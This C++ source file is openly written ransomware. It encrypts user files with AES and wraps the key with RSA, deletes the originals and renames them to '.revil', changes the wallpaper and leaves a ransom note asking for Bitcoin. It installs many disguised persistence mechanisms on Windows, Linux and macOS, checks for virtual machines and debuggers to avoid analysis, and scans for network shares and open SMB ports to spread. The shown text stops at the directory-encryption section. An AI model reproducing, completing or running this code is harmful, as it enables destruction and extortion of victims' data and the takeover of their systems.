#include <cryptlib.h>
#include <aes.h>
#include <rsa.h>
#include <osrng.h>
#include <modes.h>
#include <filters.h>
#include <files.h>

#ifdef _WIN32
#include <windows.h>
#include <shlobj.h>
#include <tlhelp32.h>
#else
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <pwd.h>
#include <grp.h>
#include <dirent.h>
#include <fcntl.h>
#endif

#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <algorithm>
#include <cctype>
#include <filesystem>
#include <cstdlib>
#include <thread>
#include <chrono>
#include <random>
#include <cstring>
#include <ctime>
#include "src/network_mapper.h"

#include <mutex>
#include <queue>
#include <condition_variable>
#include <functional>
#include <atomic>
#include <netinet/in.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <sys/time.h>
#include <sstream>      // untuk parsing /proc/mounts

using namespace CryptoPP;
namespace fs = std::filesystem;

// ====================== KONFIGURASI ======================
const std::vector<std::string> TARGET_EXTENSIONS = {
    ".txt", ".doc", ".docx", ".pdf", ".xls", ".xlsx", ".ppt", ".pptx",
    ".jpg", ".jpeg", ".png", ".gif", ".mp4", ".mov", ".avi",
    ".sql", ".db", ".cpp", ".h", ".py", ".js", ".ts",
    ".csv", ".zip", ".rar", ".7z", ".md"
};

const std::vector<std::string> ENCRYPTED_EXTENSIONS = {
    ".revil"
};

const std::vector<std::string> EXCLUDE_KEYWORDS = {
    "winlogon.exe", ".dll", ".sys", ".exe", ".ini", "pagefile.sys", "hiberfil.sys",
    "rs", "rs.cpp", "rs_debug", "generate_keys"
};

const std::string LOG_FILE = "affected_files.log";

const std::vector<std::string> CRITICAL_SKIP_PREFIXES = {
#ifdef _WIN32
    "C:\\Windows\\", "C:\\Program Files\\", "C:\\Program Files (x86)\\",
    "C:\\$Recycle.Bin\\", "C:\\System Volume Information\\",
    "C:\\PerfLogs\\", "C:\\Recovery\\"
#else
    "/bin/", "/sbin/", "/etc/", "/dev/", "/proc/", "/sys/", "/lib/", "/lib64/",
    "/usr/", "/var/log/", "/run/", "/boot/", "/root/.ssh/", "/etc/ssh/",
    "/snap/", "/var/lib/snapd/"
#endif
};

const std::string PUBLIC_KEY_FILE = "rsa_public.der";
std::mutex log_mutex;

// ====================== THREAD POOL ======================
class ThreadPool {
private:
    std::vector<std::thread> workers;
    std::queue<std::function<void()>> tasks;
    std::mutex queue_mutex;
    std::condition_variable condition;
    std::atomic<bool> stop{false};

public:
    explicit ThreadPool(size_t threads = std::thread::hardware_concurrency() * 2) {
        for (size_t i = 0; i < threads; ++i) {
            workers.emplace_back([this] {
                while (true) {
                    std::function<void()> task;
                    {
                        std::unique_lock<std::mutex> lock(queue_mutex);
                        condition.wait(lock, [this] { return stop || !tasks.empty(); });
                        if (stop && tasks.empty()) return;
                        task = std::move(tasks.front());
                        tasks.pop();
                    }
                    task();
                }
            });
        }
    }

    template<class F>
    void enqueue(F&& task) {
        {
            std::unique_lock<std::mutex> lock(queue_mutex);
            if (stop) return;
            tasks.emplace(std::forward<F>(task));
        }
        condition.notify_one();
    }

    ~ThreadPool() {
        stop = true;
        condition.notify_all();
        for (std::thread& worker : workers) {
            if (worker.joinable()) worker.join();
        }
    }
};


// ====================== WALLPAPER CLASS ======================
class WallpaperChanger {
private:
    std::string create_ransom_wallpaper() {
        std::string wallpaper_path;
        
#ifdef _WIN32
        char temp_path[MAX_PATH];
        GetTempPathA(MAX_PATH, temp_path);
        wallpaper_path = std::string(temp_path) + "\\ransom_wallpaper.bmp";
#else
        const char* home = getenv("HOME");
        if (!home) home = "/tmp";
        wallpaper_path = std::string(home) + "/.ransom_wallpaper.jpg";
#endif
        
        // Create wallpaper image with text
        std::ofstream wallpaper_file(wallpaper_path, std::ios::binary);
        
        // Simple ASCII art for wallpaper (in real scenario, you'd use a library like stb_image_write)
        // For demo, we'll create a text file and use system commands to convert
        
#ifdef _WIN32
        // Windows: Create BMP header and simple pattern
        unsigned char bmp_header[54] = {
            0x42, 0x4D, 0x36, 0x58, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x36, 0x00, 0x00, 0x00,
            0x28, 0x00, 0x00, 0x00, 0x40, 0x01, 0x00, 0x00, 0xF0, 0x00, 0x00, 0x00, 0x01, 0x00,
            0x18, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x58, 0x00, 0x00, 0x13, 0x0B, 0x00, 0x00,
            0x13, 0x0B, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
        };
        
        // Set dimensions: 320x240
        int width = 320;
        int height = 240;
        
        bmp_header[18] = width & 0xFF;
        bmp_header[19] = (width >> 8) & 0xFF;
        bmp_header[22] = height & 0xFF;
        bmp_header[23] = (height >> 8) & 0xFF;
        
        wallpaper_file.write(reinterpret_cast<char*>(bmp_header), 54);
        
        // Create red background with black text (simulated)
        for (int y = 0; y < height; y++) {
            for (int x = 0; x < width; x++) {
                unsigned char pixel[3];
                
                if (y < 50 || y > height - 50) {
                    // Black bars
                    pixel[0] = 0;     // Blue
                    pixel[1] = 0;     // Green
                    pixel[2] = 0;     // Red
                } else if (x > 50 && x < width - 50 && y > 80 && y < 160) {
                    // White text area
                    pixel[0] = 255;
                    pixel[1] = 255;
                    pixel[2] = 255;
                } else {
                    // Red background
                    pixel[0] = 0;
                    pixel[1] = 0;
                    pixel[2] = 200;
                }
                
                wallpaper_file.write(reinterpret_cast<char*>(pixel), 3);
            }
        }
#else
        // Linux/macOS: Create simple PPM format (easier than BMP)
        wallpaper_path += ".ppm";
        int width = 800;
        int height = 600;
        
        wallpaper_file << "P6\n" << width << " " << height << "\n255\n";
        
        for (int y = 0; y < height; y++) {
            for (int x = 0; x < width; x++) {
                unsigned char pixel[3];
                
                if (y < 100 || y > height - 100) {
                    // Black bars
                    pixel[0] = 0; pixel[1] = 0; pixel[2] = 0;
                } else if (x > 200 && x < width - 200 && y > 200 && y < 400) {
                    // White text area
                    pixel[0] = 255; pixel[1] = 255; pixel[2] = 255;
                } else {
                    // Red background
                    pixel[0] = 200; pixel[1] = 0; pixel[2] = 0;
                }
                
                wallpaper_file.write(reinterpret_cast<char*>(pixel), 3);
            }
        }
        
        // Convert PPM to JPG using ImageMagick if available
        std::string jpg_path = wallpaper_path.substr(0, wallpaper_path.length() - 4);
        std::string convert_cmd = "convert " + wallpaper_path + " " + jpg_path + " 2>/dev/null";
        system(convert_cmd.c_str());
        
        // Remove PPM file
        fs::remove(wallpaper_path);
        
        return jpg_path;
#endif
        
        wallpaper_file.close();
        return wallpaper_path;
    }
    
public:
    void change_wallpaper() {
        std::cout << "[*] Changing wallpaper...\n";
        
        std::string wallpaper_path = create_ransom_wallpaper();
        
#ifdef _WIN32
        // Windows wallpaper change
        HKEY hKey;
        // First, enable wallpaper change
        if (RegOpenKeyExA(HKEY_CURRENT_USER, 
            "Control Panel\\Desktop", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
            
            // Set wallpaper style (2 = stretched)
            const char* wallpaper_style = "2";
            RegSetValueExA(hKey, "WallpaperStyle", 0, REG_SZ, 
                          (BYTE*)wallpaper_style, strlen(wallpaper_style) + 1);
            
            // Set tile wallpaper (0 = no tile)
            const char* tile_wallpaper = "0";
            RegSetValueExA(hKey, "TileWallpaper", 0, REG_SZ, 
                          (BYTE*)tile_wallpaper, strlen(tile_wallpaper) + 1);
            
            RegCloseKey(hKey);
        }
        
        // Set wallpaper using SystemParametersInfo
        bool result = SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, 
                                           (PVOID)wallpaper_path.c_str(), 
                                           SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
        
        if (result) {
            std::cout << "[✓] Windows wallpaper changed successfully\n";
        } else {
            std::cout << "[!] Failed to change Windows wallpaper\n";
        }
        
#elif defined(__linux__)
        // Linux wallpaper change (multiple desktop environments)
        std::vector<std::string> commands = {
            // GNOME
            "gsettings set org.gnome.desktop.background picture-uri 'file://" + wallpaper_path + "' 2>/dev/null",
            "gsettings set org.gnome.desktop.background picture-uri-dark 'file://" + wallpaper_path + "' 2>/dev/null",
            
            // KDE Plasma
            "plasma-apply-wallpaperimage '" + wallpaper_path + "' 2>/dev/null",
            
            // XFCE
            "xfconf-query -c xfce4-desktop -p /backdrop/screen0/monitor0/image-path -s '" + wallpaper_path + "' 2>/dev/null",
            "xfconf-query -c xfce4-desktop -p /backdrop/screen0/monitor0/workspace0/last-image -s '" + wallpaper_path + "' 2>/dev/null",
            
            // Cinnamon
            "gsettings set org.cinnamon.desktop.background picture-uri 'file://" + wallpaper_path + "' 2>/dev/null",
            
            // MATE
            "gsettings set org.mate.background picture-filename '" + wallpaper_path + "' 2>/dev/null",
            
            // LXDE
            "pcmanfm --set-wallpaper='" + wallpaper_path + "' 2>/dev/null",
            
            // Generic (feh)
            "feh --bg-scale '" + wallpaper_path + "' 2>/dev/null",
            
            // Nitrogen
            "nitrogen --set-zoom-fill '" + wallpaper_path + "' 2>/dev/null"
        };
        
        bool success = false;
        for (const auto& cmd : commands) {
            if (system(cmd.c_str()) == 0) {
                success = true;
                break;
            }
        }
        
        if (success) {
            std::cout << "[✓] Linux wallpaper changed successfully\n";
        } else {
            std::cout << "[!] Could not change Linux wallpaper\n";
        }
        
#elif defined(__APPLE__)
        // macOS wallpaper change
        std::string applescript = 
            "osascript -e 'tell application \"Finder\" to set desktop picture to POSIX file \"" + 
            wallpaper_path + "\"' 2>/dev/null";
        
        if (system(applescript.c_str()) == 0) {
            std::cout << "[✓] macOS wallpaper changed successfully\n";
        } else {
            // Alternative method
            applescript = 
                "osascript -e 'tell application \"System Events\" to set picture of every desktop to \"" + 
                wallpaper_path + "\"' 2>/dev/null";
            
            if (system(applescript.c_str()) == 0) {
                std::cout << "[✓] macOS wallpaper changed successfully\n";
            } else {
                std::cout << "[!] Failed to change macOS wallpaper\n";
            }
        }
#endif
    }
    
    void create_readme_file() {
        std::string readme_path;
        
#ifdef _WIN32
        char desktop[MAX_PATH];
        SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, desktop);
        readme_path = std::string(desktop) + "\\README_LOCKED.txt";
#else
        const char* home = getenv("HOME");
        if (!home) home = ".";
        readme_path = std::string(home) + "/Desktop/README_LOCKED.txt";
#endif
        
        std::ofstream readme(readme_path);
        readme << "========================================\n";
        readme << "     YOUR FILES HAVE BEEN ENCRYPTED    \n";
        readme << "========================================\n\n";
        readme << "All your important files have been encrypted with AES-256.\n";
        readme << "Your wallpaper has been changed as a warning.\n\n";
        readme << "To recover your files:\n";
        readme << "1. Send $500 worth of Bitcoin to: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa\n";
        readme << "2. Email the transaction ID to: decrypt@onionmail.org\n";
        readme << "3. You will receive a decryption key within 24 hours\n\n";
        readme << "Your Unique ID: " << std::hex << getpid() << "\n\n";
        readme << "DO NOT attempt to decrypt files yourself!\n";
        readme << "DO NOT modify encrypted files!\n";
        readme.close();
        
        std::cout << "[✓] README file created on desktop\n";
    }
};

// ====================== PERSISTENCE CLASS ======================

class PersistenceManager {
private:
    std::string current_exe;
    std::string persistent_path;
    bool is_admin;
    
#ifdef _WIN32
    // Windows-specific persistence methods
    void install_registry_run() {
        HKEY hKey;
        std::vector<std::pair<HKEY, std::string>> registry_locations = {
            {HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run"},
            {HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce"},
            {HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run"}
        };
        
        std::vector<std::string> hidden_names = {
            "WindowsUpdate", "MicrosoftEdgeUpdate", "AdobeFlashUpdate",
            "JavaUpdate", "ChromeUpdate", "DriverUpdate", "SecurityHealth"
        };
        
        srand(time(NULL));
        
        for (const auto& loc : registry_locations) {
            if (RegOpenKeyExA(loc.first, loc.second.c_str(), 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
                std::string name = hidden_names[rand() % hidden_names.size()];
                RegSetValueExA(hKey, name.c_str(), 0, REG_SZ, 
                              (BYTE*)persistent_path.c_str(), persistent_path.size() + 1);
                RegCloseKey(hKey);
                std::cout << "[✓] Registry persistence added: " << name << "\n";
            }
        }
    }
    
    void install_scheduled_task() {
        std::string task_name = "MicrosoftEdgeUpdateTask";
        std::string cmd = "schtasks /create /tn \"" + task_name + "\" /tr \"" + 
                          persistent_path + "\" /sc daily /st 09:00 /f";
        system(cmd.c_str());
        std::cout << "[✓] Scheduled task created\n";
        
        // Also create at logon
        cmd = "schtasks /create /tn \"" + task_name + "Logon\" /tr \"" + 
              persistent_path + "\" /sc onlogon /f";
        system(cmd.c_str());
    }
    
    void install_startup_folder() {
        char path[MAX_PATH];
        
        // Current User Startup
        SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, path);
        std::string startup = std::string(path) + "\\SystemHelper.exe";
        
        std::ifstream src(current_exe, std::ios::binary);
        std::ofstream dst(startup, std::ios::binary);
        dst << src.rdbuf();
        dst.close();
        
        // Hide file
        SetFileAttributesA(startup.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
        std::cout << "[✓] Startup folder persistence added\n";
    }
    
    void install_service() {
        if (!is_admin) return;
        
        SC_HANDLE scm = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
        if (scm) {
            SC_HANDLE service = CreateServiceA(
                scm,
                "WindowsUpdateService",
                "Windows Update Service",
                SERVICE_ALL_ACCESS,
                SERVICE_WIN32_OWN_PROCESS,
                SERVICE_AUTO_START,
                SERVICE_ERROR_IGNORE,
                persistent_path.c_str(),
                NULL, NULL, NULL, NULL, NULL
            );
            
            if (service) {
                StartService(service, 0, NULL);
                CloseHandle(service);
                std::cout << "[✓] Windows service installed\n";
            }
            CloseServiceHandle(scm);
        }
    }
    
    void install_wmi_persistence() {
        if (!is_admin) return;
        
        std::string wmi_script = 
            "powershell -Command \"$filter = ([wmiclass]\\\"\\\\\\\\.\\\\root\\\\subscription:__EventFilter\\\").CreateInstance(); "
            "$filter.QueryLanguage = \\\"WQL\\\"; "
            "$filter.Query = \\\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'\\\"; "
            "$filter.Name = \\\"SystemMonitor\\\"; "
            "$filter.EventNamespace = \\\"root\\\\cimv2\\\"; "
            "$filter.Put(); "
            "$consumer = ([wmiclass]\\\"\\\\\\\\.\\\\root\\\\subscription:CommandLineEventConsumer\\\").CreateInstance(); "
            "$consumer.Name = \\\"SystemMonitorConsumer\\\"; "
            "$consumer.CommandLineTemplate = \\\"" + persistent_path + "\\\"; "
            "$consumer.Put(); "
            "$binding = ([wmiclass]\\\"\\\\\\\\.\\\\root\\\\subscription:__FilterToConsumerBinding\\\").CreateInstance(); "
            "$binding.Filter = $filter; "
            "$binding.Consumer = $consumer; "
            "$binding.Put();\"";
        
        system(wmi_script.c_str());
        std::cout << "[✓] WMI persistence installed\n";
    }
    
    void install_image_file_execution_options() {
        if (!is_admin) return;
        
        HKEY hKey;
        std::string target = "notepad.exe";
        std::string key_path = "Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\" + target;
        
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, key_path.c_str(), 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
            RegSetValueExA(hKey, "Debugger", 0, REG_SZ, 
                          (BYTE*)persistent_path.c_str(), persistent_path.size() + 1);
            RegCloseKey(hKey);
            std::cout << "[✓] IFEO persistence installed\n";
        }
    }
    
    void install_userinit() {
        if (!is_admin) return;
        
        HKEY hKey;
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, 
            "Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
            
            char userinit[1024];
            DWORD size = sizeof(userinit);
            RegQueryValueExA(hKey, "Userinit", NULL, NULL, (BYTE*)userinit, &size);
            
            std::string new_userinit = std::string(userinit) + "," + persistent_path;
            RegSetValueExA(hKey, "Userinit", 0, REG_SZ, 
                          (BYTE*)new_userinit.c_str(), new_userinit.size() + 1);
            RegCloseKey(hKey);
            std::cout << "[✓] Userinit persistence installed\n";
        }
    }
    
#else
    // Linux/macOS persistence methods
    void install_cron_persistence() {
        std::string cron_cmd = persistent_path + " > /dev/null 2>&1";
        
        // User crontab
        std::string user_cron = "*/30 * * * * " + cron_cmd;
        std::string cmd = "(crontab -l 2>/dev/null; echo \"" + user_cron + "\") | crontab -";
        int result = system(cmd.c_str());
        if (result == 0) {
            std::cout << "[✓] Cron job installed\n";
        }
        
        // System crontab (if root)
        if (is_admin) {
            std::ofstream cron("/etc/cron.d/system-update");
            cron << "*/15 * * * * root " + persistent_path + "\n";
            cron.close();
            std::cout << "[✓] System cron installed\n";
        }
    }
    
    void install_profile_persistence() {
        std::string persistent_path = this->persistent_path;
        
        // Get home directory
        const char* home = getenv("HOME");
        if (!home) {
            struct passwd* pw = getpwuid(getuid());
            if (pw) home = pw->pw_dir;
        }
        
        if (home) {
            std::string home_str(home);
            
            // User profiles
            std::vector<std::string> profile_files = {
                home_str + "/.bashrc",
                home_str + "/.bash_profile",
                home_str + "/.zshrc",
                home_str + "/.profile"
            };
            
            for (const auto& file : profile_files) {
                std::string cmd = "echo '" + persistent_path + " &' >> " + file;
                system(cmd.c_str());
            }
            std::cout << "[✓] Profile persistence installed\n";
        }
        
        // System profile
        if (is_admin) {
            std::ofstream profile("/etc/profile.d/update.sh");
            profile << persistent_path + " &\n";
            profile.close();
            chmod("/etc/profile.d/update.sh", 0755);
            std::cout << "[✓] System profile installed\n";
        }
    }
    
    void install_systemd_service() {
        #ifdef __linux__
        if (!is_admin) return;
        
        std::string service = 
            "[Unit]\n"
            "Description=System Update Service\n"
            "After=network.target\n\n"
            "[Service]\n"
            "Type=simple\n"
            "ExecStart=" + persistent_path + "\n"
            "Restart=always\n"
            "RestartSec=60\n\n"
            "[Install]\n"
            "WantedBy=multi-user.target\n";
        
        std::ofstream service_file("/etc/systemd/system/system-update.service");
        service_file << service;
        service_file.close();
        
        system("systemctl daemon-reload");
        system("systemctl enable system-update.service");
        system("systemctl start system-update.service");
        std::cout << "[✓] Systemd service installed\n";
        #endif
    }
    
    #ifdef __APPLE__
    void install_launch_agent() {
        const char* home = getenv("HOME");
        if (!home) return;
        
        std::string agent_plist = 
            "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
            "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" "
            "\"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n"
            "<plist version=\"1.0\">\n"
            "<dict>\n"
            "    <key>Label</key>\n"
            "    <string>com.apple.update</string>\n"
            "    <key>ProgramArguments</key>\n"
            "    <array>\n"
            "        <string>" + persistent_path + "</string>\n"
            "    </array>\n"
            "    <key>RunAtLoad</key>\n"
            "    <true/>\n"
            "</dict>\n"
            "</plist>\n";
        
        // User LaunchAgents
        std::string user_agent = std::string(home) + "/Library/LaunchAgents/com.apple.update.plist";
        std::ofstream ua(user_agent);
        ua << agent_plist;
        ua.close();
        
        system(("launchctl load " + user_agent).c_str());
        std::cout << "[✓] LaunchAgent installed\n";
    }
    #endif
#endif
    
    void hide_file() {
#ifdef _WIN32
        SetFileAttributesA(persistent_path.c_str(), 
                          FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
        std::cout << "[✓] File hidden\n";
#else
        std::string dir = persistent_path.substr(0, persistent_path.find_last_of('/'));
        std::string file = persistent_path.substr(persistent_path.find_last_of('/') + 1);
        
        // Only hide if not already hidden
        if (file[0] != '.') {
            std::string hidden_path = dir + "/." + file;
            rename(persistent_path.c_str(), hidden_path.c_str());
            persistent_path = hidden_path;
            std::cout << "[✓] File hidden as: " << persistent_path << "\n";
        }
#endif
    }
    
    bool copy_to_persistent() {
        std::cout << "[*] Copying to: " << persistent_path << "\n";
        
        std::ifstream src(current_exe, std::ios::binary);
        std::ofstream dst(persistent_path, std::ios::binary);
        
        if (!src || !dst) {
            std::cout << "[!] Failed to open files\n";
            return false;
        }
        
        dst << src.rdbuf();
        dst.close();
        src.close();
        
#ifdef _WIN32
        // Set as system file
        SetFileAttributesA(persistent_path.c_str(), FILE_ATTRIBUTE_SYSTEM);
#else
        // Set executable permission
        chmod(persistent_path.c_str(), 0755);
#endif
        
        std::cout << "[✓] File copied successfully\n";
        return true;
    }
    
    std::string get_persistent_location() {
#ifdef _WIN32
        char path[MAX_PATH];
        
        if (is_admin) {
            GetWindowsDirectoryA(path, MAX_PATH);
            return std::string(path) + "\\System32\\drivers\\svchost.exe";
        } else {
            GetTempPathA(MAX_PATH, path);
            return std::string(path) + "\\MicrosoftEdgeUpdate.exe";
        }
#else
        if (is_admin) {
            return "/usr/bin/.systemd-update";
        } else {
            const char* home = getenv("HOME");
            if (!home) {
                struct passwd* pw = getpwuid(getuid());
                if (pw) home = pw->pw_dir;
            }
            if (home) {
                return std::string(home) + "/.config/.pulseaudio";
            }
            return "/tmp/.update";
        }
#endif
    }
    
    bool check_admin() {
#ifdef _WIN32
        BOOL isAdmin = FALSE;
        SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
        PSID AdministratorsGroup;
        if (AllocateAndInitializeSid(&NtAuthority, 2,
            SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,
            0, 0, 0, 0, 0, 0, &AdministratorsGroup)) {
            CheckTokenMembership(NULL, AdministratorsGroup, &isAdmin);
            FreeSid(AdministratorsGroup);
        }
        return isAdmin;
#else
        return geteuid() == 0;
#endif
    }
    
    std::string get_current_exe() {
#ifdef _WIN32
        char path[MAX_PATH];
        GetModuleFileNameA(NULL, path, MAX_PATH);
        return std::string(path);
#else
        char path[1024];
        ssize_t len = readlink("/proc/self/exe", path, sizeof(path)-1);
        if (len != -1) {
            path[len] = '\0';
            return std::string(path);
        }
        return "";
#endif
    }
    
public:
    PersistenceManager() {
        current_exe = get_current_exe();
        is_admin = check_admin();
        persistent_path = get_persistent_location();
        
        std::cout << "[DEBUG] Current exe: " << current_exe << "\n";
        std::cout << "[DEBUG] Is admin: " << (is_admin ? "yes" : "no") << "\n";
    }
    
    void install_all() {
        std::cout << "\n[*] Installing persistence mechanisms...\n";
        
        // Don't install if already in persistent location
        if (current_exe == persistent_path) {
            std::cout << "[*] Already running from persistent location\n";
            return;
        }
        
        // Copy to persistent location
        if (!copy_to_persistent()) {
            std::cout << "[!] Failed to copy to persistent location\n";
            return;
        }
        
        // Hide the file
        hide_file();
        
#ifdef _WIN32
        // Windows persistence methods
        install_registry_run();
        install_scheduled_task();
        install_startup_folder();
        
        if (is_admin) {
            install_service();
            install_wmi_persistence();
            install_image_file_execution_options();
            install_userinit();
        }
        
        std::cout << "[✓] Windows persistence installed\n";
        
#elif defined(__linux__)
        // Linux persistence methods
        install_cron_persistence();
        install_profile_persistence();
        
        if (is_admin) {
            install_systemd_service();
        }
        
        std::cout << "[✓] Linux persistence installed\n";
        
#elif defined(__APPLE__)
        // macOS persistence methods
        install_cron_persistence();
        install_profile_persistence();
        install_launch_agent();
        
        std::cout << "[✓] macOS persistence installed\n";
#endif
        
        std::cout << "[*] Location: " << persistent_path << "\n\n";
    }
    
    void check_and_reinstall() {
        while (true) {
            std::this_thread::sleep_for(std::chrono::hours(1));
            
            if (!fs::exists(persistent_path)) {
                std::cout << "[*] Persistence removed, reinstalling...\n";
                install_all();
            } else {
                std::cout << "[*] Persistence check: OK\n";
            }
        }
    }
    
    bool is_persistent() {
        return current_exe == persistent_path;
    }
};

// ====================== HELPER FUNCTIONS ======================

bool is_virtual_machine() {
#ifdef _WIN32
    SYSTEM_INFO si; GetSystemInfo(&si);
    if (si.dwNumberOfProcessors <= 2) return true;

    MEMORYSTATUSEX mem; mem.dwLength = sizeof(mem);
    GlobalMemoryStatusEx(&mem);
    if (mem.ullTotalPhys < (2ULL * 1024 * 1024 * 1024)) return true;
    
    // Check for VM processes
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);
    
    if (Process32First(hSnapshot, &pe)) {
        do {
            std::string proc = pe.szExeFile;
            std::transform(proc.begin(), proc.end(), proc.begin(), ::tolower);
            if (proc.find("vbox") != std::string::npos ||
                proc.find("vmware") != std::string::npos ||
                proc.find("xensource") != std::string::npos) {
                CloseHandle(hSnapshot);
                return true;
            }
        } while (Process32Next(hSnapshot, &pe));
    }
    CloseHandle(hSnapshot);
#endif
    return false;
}

bool is_debugger_present() {
#ifdef _WIN32
    return IsDebuggerPresent() != 0;
#else
    std::ifstream status("/proc/self/status");
    std::string line;
    while (getline(status, line)) {
        if (line.find("TracerPid:") == 0) {
            int pid = std::stoi(line.substr(10));
            return pid != 0;
        }
    }
    return false;
#endif
}

std::string to_lower(const std::string& s) {
    std::string lower = s;
    std::transform(lower.begin(), lower.end(), lower.begin(),
                   [](unsigned char c){ return std::tolower(c); });
    return lower;
}

bool ends_with(const std::string& str, const std::string& suffix) {
    if (suffix.size() > str.size()) return false;
    return str.compare(str.size() - suffix.size(), suffix.size(), suffix) == 0;
}

bool should_encrypt(const std::string& filepath) {
    std::string filename = fs::path(filepath).filename().string();
    std::string lname = to_lower(filename);

    // Skip if already encrypted
    for (const auto& ext : ENCRYPTED_EXTENSIONS)
        if (ends_with(lname, ext)) return false;

    // Skip excluded keywords
    for (const auto& kw : EXCLUDE_KEYWORDS)
        if (lname.find(to_lower(kw)) != std::string::npos) return false;

    // Check target extensions
    for (const auto& ext : TARGET_EXTENSIONS)
        if (ends_with(lname, ext)) return true;

    return false;
}

bool is_critical_path(const std::string& path) {
    std::string lpath = to_lower(path);
    for (const auto& prefix : CRITICAL_SKIP_PREFIXES)
        if (lpath.find(to_lower(prefix)) == 0) return true;
    return false;
}


// ====================== LATERAL MOVEMENT HELPERS ======================

std::vector<std::string> get_mounted_network_shares() {
    std::vector<std::string> mounts;
    std::ifstream file("/proc/mounts");
    if (!file.is_open()) return mounts;

    std::string line;
    while (std::getline(file, line)) {
        if (line.find("cifs") != std::string::npos ||
            line.find("nfs") != std::string::npos ||
            line.find("smb") != std::string::npos) {
            
            std::istringstream iss(line);
            std::string dev, mp, fs;
            iss >> dev >> mp >> fs;
            
            // Skip root dan folder lokal biasa
            if (mp != "/" && mp != "/boot" && mp != "/home" && !mp.empty()) {
                mounts.push_back(mp);
            }
        }
    }
    return mounts;
}

bool is_port_open(const std::string& ip, int port = 445) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return false;

    struct sockaddr_in addr{};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    inet_pton(AF_INET, ip.c_str(), &addr.sin_addr);

    struct timeval tv{};
    tv.tv_sec = 1;      // timeout 1 detik
    tv.tv_usec = 0;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));

    bool open = (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == 0);
    close(sock);
    return open;
}

std::string get_local_subnet() {
    char buffer[128] = {0};
    std::string result;

    FILE* pipe = popen("ip -o route get 1 | awk '{print $7}' | cut -d. -f1-3", "r");
    if (pipe) {
        if (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
            result = buffer;
        }
        pclose(pipe);
    }

    // Bersihkan newline
    result.erase(std::remove(result.begin(), result.end(), '\n'), result.end());
    result.erase(std::remove(result.begin(), result.end(), '\r'), result.end());

    if (result.empty()) return "192.168.1";   // fallback untuk jaringan rumah
    return result;
}



// ====================== RSA PUBLIC KEY LOADER ======================

RSA::PublicKey load_public_key(const std::string& filename) {
    RSA::PublicKey pub;
    FileSource file(filename.c_str(), true);
    pub.Load(file);
    return pub;
}

// ====================== ENCRYPT AES KEY DENGAN PUBLIC KEY ======================

void rsa_encrypt_aes_key(const SecByteBlock& aes_key, std::string& out_encrypted) {
    AutoSeededRandomPool rng;
    RSA::PublicKey pub = load_public_key(PUBLIC_KEY_FILE);

    RSAES_OAEP_SHA_Encryptor enc(pub);
    StringSource(aes_key, aes_key.size(), true,
        new PK_EncryptorFilter(rng, enc, new StringSink(out_encrypted))
    );
}

// ====================== ENCRYPT FILE ======================

void encrypt_file(const std::string& filepath, const SecByteBlock& key, const byte* iv) {
    try {
        {
            std::lock_guard<std::mutex> lock(log_mutex);
            std::cout << "  [*] Encrypting: " << filepath << "\n";
        }

        std::string plaintext;
        FileSource(filepath.c_str(), true, new StringSink(plaintext));

        CBC_Mode<AES>::Encryption enc;
        enc.SetKeyWithIV(key, key.size(), iv);

        std::string ciphertext;
        StringSource(plaintext, true,
            new StreamTransformationFilter(enc, new StringSink(ciphertext))
        );

        std::string encpath = filepath + ".revil";
        {
            FileSink out(encpath.c_str());
            out.Put(iv, AES::BLOCKSIZE);
            out.Put(reinterpret_cast<const byte*>(ciphertext.data()), ciphertext.size());
        }

        std::error_code ec;
        fs::remove(filepath, ec);

        // Logging aman
        {
            std::lock_guard<std::mutex> lock(log_mutex);
            std::ofstream log(LOG_FILE, std::ios::app);
            if (log) log << filepath << " → " << encpath << "\n";
            std::cout << "  [✓] Encrypted: " << filepath << "\n";
        }
    }
    catch (const std::exception& e) {
        std::lock_guard<std::mutex> lock(log_mutex);
        std::cout << "  [✗] Failed " << filepath << ": " << e.what() << "\n";
    }
}

// ====================== ENCRYPT DIRECTORY ======================
